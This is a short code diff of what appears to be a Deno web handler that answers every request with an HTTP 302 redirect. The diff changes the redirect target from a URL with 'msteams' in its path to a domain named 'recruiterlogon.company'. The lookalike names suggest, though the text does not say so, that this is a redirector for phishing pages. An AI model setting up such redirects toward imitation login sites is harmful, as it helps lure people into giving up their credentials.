@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dotshopper.net/msteams/", // Replace this with your actual link
+      Location: "https://recruiterlogon.company/", // Replace this with your actual link
     },
   });
 });
